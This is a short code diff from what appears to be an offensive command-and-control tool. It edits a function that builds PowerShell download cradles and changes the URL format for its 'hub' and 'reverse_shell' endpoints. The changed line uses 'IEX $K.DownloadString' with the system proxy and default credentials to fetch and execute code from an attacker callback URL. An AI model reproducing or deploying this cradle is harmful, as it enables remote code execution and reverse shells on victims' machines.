@@ -106,8 +106,8 @@ webdav_url = 'http://%s:%d/webdav' % (
 )
 
 endpoints = {
-    'hub': "0",
-    'reverse_shell': "0?r",
+    'hub': "h",
+    'reverse_shell': "r",
 }
 
 
@@ -135,9 +135,10 @@ def build_cradle(get_args, flavor="hub"):
             result += ("$K.Proxy=[Net.WebRequest]::GetSystemWebProxy();"
                        "$K.Proxy.Credentials=[Net.CredentialCache]::"
                        "DefaultCredentials;")
-        result += "IEX $K.DownloadString(\"%s%s\");"
+        result += "IEX $K.DownloadString(\"%s0?t=%s&f=%s\");"
         result = result % (
             callback_urls[get_args['GroupTransport']],
+            get_args['GroupTransport'],
             endpoints[flavor],
         )
 
